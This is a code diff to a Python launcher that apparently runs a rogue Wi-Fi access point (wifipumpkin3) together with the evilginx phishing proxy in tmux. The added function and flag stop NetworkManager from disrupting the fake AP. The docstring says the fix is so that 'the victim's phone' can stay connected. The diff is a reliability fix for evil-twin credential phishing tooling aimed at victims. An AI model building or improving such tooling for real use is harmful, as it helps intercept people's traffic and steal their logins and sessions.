@@ -252,6 +252,25 @@ def full_reset():
     time.sleep(3)
 
 
+def release_from_networkmanager(interface):
+    """Ask NetworkManager to stop touching the AP interface.
+
+    Symptom without this: the AP flashes on and off. NetworkManager still owns
+    wlan1 while wp3 puts it in AP mode, so NM keeps issuing disconnects because
+    from its point of view the interface has 'no connection', hostapd drops,
+    the SSID vanishes for a moment and comes back, and the victim's phone
+    cannot hold an association. dmesg shows repeated 'entered promiscuous mode'
+    / 'left promiscuous mode' cycles on the adapter.
+
+    Two things: tell NM to leave it alone for the lifetime of the run (nmcli
+    device set <iface> managed no), and pass wp3 the -iNM flag so it also asks
+    on start. Belt and braces because the two interact through different code
+    paths and either alone has been seen to lose the race.
+    """
+    subprocess.run(["nmcli", "device", "set", interface, "managed", "no"],
+                   stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+
+
 def start_in_tmux(interface):
     """wp3 first (creates the AP), then evilginx, each in a tmux window.
 
@@ -262,9 +281,12 @@ def start_in_tmux(interface):
                           stdout=subprocess.DEVNULL).returncode == 0:
         sys.exit("tmux is not installed; needed to run both tools")
     full_reset()
+    release_from_networkmanager(interface)
     subprocess.run([
         "tmux", "new-session", "-d", "-s", "phishkin3", "-n", "wp3",
-        "wifipumpkin3 -p %s" % PULP_PATH])
+        # -iNM keeps NetworkManager from touching the AP interface for the
+        # duration of the wp3 session.
+        "wifipumpkin3 -iNM %s -p %s" % (interface, PULP_PATH)])
     say("started wp3 in tmux (window wp3)")
     time.sleep(8)  # let the AP come up before evilginx binds
     subprocess.run([
